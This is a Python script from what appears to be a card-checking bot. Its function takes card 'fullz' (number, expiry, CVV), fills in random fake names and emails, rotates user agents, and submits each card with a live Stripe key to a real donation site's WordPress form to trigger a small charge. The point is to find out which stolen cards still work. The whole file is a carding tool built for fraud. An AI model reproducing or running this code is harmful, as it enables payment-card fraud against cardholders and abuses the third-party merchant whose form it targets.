import asyncio
import requests
import logging
from fake_useragent import UserAgent  # Assuming you are using this
# ... any other imports ...
from FUNC.defs import *
import re
from bs4 import BeautifulSoup
from FUNC.defs import *

# import requests

logging.basicConfig(level=logging.INFO, filename="bot.log", filemode="w",
                    format='%(asctime)s - %(levelname)s - %(message)s')

def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None

async def create_cvv_charge(fullz, session):
    logging.info(f"Starting create_cvv_charge for {fullz}")
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user_agent = UserAgent().random
        random_data = await get_random_info(session)

        if random_data is None:
            logging.warning("get_random_info returned None, cannot continue")
            return "Error: Could not retrieve random information."

        fname = random_data["fname"]
        lname = random_data["lname"]
        email = random_data["email"]

        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': '8767fe05-30b7-4a3e-b5be-3952943deba3d9e5e9',
            'muid': '06cd1deb-58df-484a-96b1-9ff05fa13a21d3456a',
            'sid': '170d3d01-0f16-4509-a427-a79a95cff0433e2fb0',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/2f7b2f7dbc1b; stripe-js-v3/2f7b2f7dbc1b; card-element',
            'referrer': 'https://lumivoce.org',
            'time_on_page': '27287',
            'key': 'pk_live_519sODGHvm9HtpVbGwn3R5HrSXBaErzDUXpjtr2lJvODEXgSV8x7UQnU3fChiIZ6hIwrgM4ubVpp1DFbUDX74ft4pV00G1pMnrpR'
        }
        logging.info(f"Data payload: {data}")

        files = {
            'action': (None, 'fluentform_submit'),
            'data': (None, f'choose_time-One%20Time%20Payment_input-Other%20Amount&custom_payment-payment_amount=1&input_text-{fname}%20{lname}&email-{email}&payment_id=654987987978987'), #Use name and email from API
            'form_id': (None, '49'),
            }

        logging.info(f"Params: {data}")
        logging.info(f"Files: {files}")

        response = await session.post(
            'https://lumivoce.org/wp-admin/admin-ajax.php',
            data=data, # Use data= for form data
            files=files,
            )
        logging.info(f"Response status: {response.status_code}")
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        response = response.text
        await asyncio.sleep(0.5)
        logging.info("Returning response")
        return response
    except requests.exceptions.RequestException as e:
        logging.exception(f"Request error: {e}")
        return f"Request failed: {str(e)}" # Include error in the response
    except KeyError as e:
        logging.exception(f"KeyError: {e}")
        return f"Error: Missing key in random_data: {str(e)}"
    except Exception as e: # Catch ALL other exceptions
        logging.exception(f"General error: {e}")
        return f"An error occurred: {str(e)}"
